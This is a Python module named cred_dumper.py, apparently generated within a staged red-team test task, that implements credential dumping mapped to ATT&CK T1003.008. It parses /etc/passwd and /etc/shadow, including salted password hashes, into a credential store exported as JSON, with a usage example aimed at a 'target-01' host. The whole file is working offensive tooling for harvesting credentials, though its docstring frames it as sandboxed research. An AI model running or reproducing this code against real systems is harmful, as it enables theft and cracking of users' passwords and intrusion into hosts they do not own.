"""
cred_dumper.py
==============
Credential access module for reading /etc/passwd and /etc/shadow.

ATT&CK Techniques:
    T1003.008 – OS Credentials: /etc/passwd and /etc/shadow
    T1003     – OS Credentials

Intended for use in isolated, sandboxed red-team research environments.
"""
from __future__ import annotations

import os
from typing import List

from data.code_scripts_PAST.stage3_test_20260909_02_40_28.TASK_001_credential_store import CredentialStore, LinuxUserEntry, ShadowEntry


def parse_passwd(path: str = '/etc/passwd') -> List[LinuxUserEntry]:
    """Read and parse /etc/passwd into a list of LinuxUserEntry objects.

    Each line is expected in the standard colon-delimited format:
        username:password:uid:gid:gecos:home:shell

    Blank lines and comment lines (starting with '#') are skipped.
    """
    entries: List[LinuxUserEntry] = []
    with open(path, 'r', encoding='utf-8') as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split(':')
            if len(parts) < 7:
                continue
            entry = LinuxUserEntry.from_passwd_line(line)
            entries.append(entry)
    return entries


def parse_shadow(path: str = '/etc/shadow') -> List[ShadowEntry]:
    """Read and parse /etc/shadow into a list of ShadowEntry objects.

    Each line is expected in the standard colon-delimited format:
        username:password_hash:last_changed:min:max:warn:inactive:expire:reserved

    The password_hash field may contain a salted hash (e.g. $6$salt$digest)
    or a placeholder such as '!' or '*'.

    Blank lines and comment lines (starting with '#') are skipped.
    """
    entries: List[ShadowEntry] = []
    with open(path, 'r', encoding='utf-8') as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split(':')
            if len(parts) < 9:
                continue
            entry = ShadowEntry.from_shadow_line(line)
            entries.append(entry)
    return entries


class CredDumper:
    """Orchestrates credential dumping from /etc/passwd and /etc/shadow.

    Usage:
        dumper = CredDumper(host_identifier='target-01')
        store = dumper.dump()
        print(store.to_json())

    ATT&CK: T1003.008, T1003
    """

    def __init__(
        self,
        passwd_path: str = '/etc/passwd',
        shadow_path: str = '/etc/shadow',
        host_identifier: str = '',
    ) -> None:
        self.passwd_path = passwd_path
        self.shadow_path = shadow_path
        self.host_identifier = host_identifier or 'unknown'
        self.store: CredentialStore = CredentialStore(
            host_identifier=self.host_identifier
        )
        self._passwd_entries: List[LinuxUserEntry] = []
        self._shadow_entries: List[ShadowEntry] = []

    # ------------------------------------------------------------------
    # Individual dump operations
    # ------------------------------------------------------------------

    def dump_passwd(self) -> List[LinuxUserEntry]:
        """Parse /etc/passwd and store entries in the CredentialStore."""
        self._passwd_entries = parse_passwd(self.passwd_path)
        for entry in self._passwd_entries:
            self.store.add_linux_user(entry)
        return self._passwd_entries

    def dump_shadow(self) -> List[ShadowEntry]:
        """Parse /etc/shadow and store entries in the CredentialStore.

        Raises FileNotFoundError if the shadow file does not exist.
        """
        self._shadow_entries = parse_shadow(self.shadow_path)
        for entry in self._shadow_entries:
            self.store.add_shadow_entry(entry)
        return self._shadow_entries

    # ------------------------------------------------------------------
    # Combined operation
    # ------------------------------------------------------------------

    def dump(self) -> CredentialStore:
        """Perform a full credential dump (passwd + shadow) and finalize.

        If /etc/shadow is not readable or does not exist, the dump
        still succeeds with only passwd data.
        """
        self.dump_passwd()
        if os.path.exists(self.shadow_path):
            try:
                self.dump_shadow()
            except (PermissionError, OSError):
                pass
        self.store.finalize()
        return self.store

    # ------------------------------------------------------------------
    # Convenience / serialization helpers
    # ------------------------------------------------------------------

    def to_dict(self) -> dict:
        """Return the store as a plain dictionary."""
        return self.store.to_dict()

    def to_json(self, *, indent: int = 2) -> str:
        """Return the store serialized as a JSON string."""
        return self.store.to_json(indent=indent)

    @property
    def total_items(self) -> int:
        """Total number of credential items collected."""
        return self.store.total_items


__all__ = ['CredDumper', 'parse_passwd', 'parse_shadow']
